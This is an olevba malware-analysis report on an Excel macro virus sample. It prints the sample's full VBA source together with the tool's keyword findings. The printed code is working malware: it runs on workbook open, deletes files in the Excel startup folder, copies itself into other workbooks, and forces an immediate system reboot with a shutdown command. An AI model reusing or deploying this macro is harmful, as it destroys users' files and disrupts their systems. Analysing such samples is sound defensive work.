olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Shutdown.a-7ba3513e14f836f3559b326691d9338f33f151c3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO SPECS.bas 
in file: Virus.MSExcel.Shutdown.a-7ba3513e14f836f3559b326691d9338f33f151c3 - OLE stream: '_VBA_PROJECT_CUR/VBA/SPECS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Application.EnableEvents = False
    For Each kil In Workbooks
    If kil.Name <> "SPECS.xls" And kil.Path = Application.StartupPath Then
    fn = kil.FullName
    kil.Close (False)
    Kill (fn)
    End If
    Next
Application.EnableEvents = True
Randomize
If ThisWorkbook.Path <> Application.StartupPath Then
    If Dir(Application.StartupPath & "\SPECS.xls") = "" Then
    Application.ScreenUpdating = False
    ThisWorkbook.Sheets(1).Copy
    nam = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks(nam).SaveAs (Application.StartupPath & "\SPECS.xls")
    End If
If Rnd() < 0.01 Then ThisWorkbook.Password = "joker"
Else
'att
If FileDateTime(Application.StartupPath & "\SPECS.xls") + 200 < Now Then Shell ("shutdown -r -f -t 00")
End If
Application.OnWindow = "cop"
Application.OnSheetActivate = "cop"
End Sub
Sub cop()
Attribute cop.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Application.ScreenUpdating = False
Application.DisplayAlerts = False
For Each mo In ActiveWorkbook.Modules
If mo.Name <> "SPECS" Then mo.Delete
Next
If ActiveWorkbook.Sheets(1).Name <> "SPECS" Then
ThisWorkbook.Sheets(1).Copy ActiveWorkbook.Sheets(1)
If ActiveWorkbook.Path <> "" Then ActiveWorkbook.Save
End If
Application.OnSheetActivate = "cop"
End Sub

Sub auto_close()
Attribute auto_close.VB_ProcData.VB_Invoke_Func = " \n14"
If Rnd() < 0.01 Then Shell ("shutdown -r -f -t 00")
End Sub
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Shutdown.a-7ba3513e14f836f3559b326691d9338f33f151c3 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  SPEC
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ü[ú
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |auto_close          |Runs when the Excel Workbook is closed       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

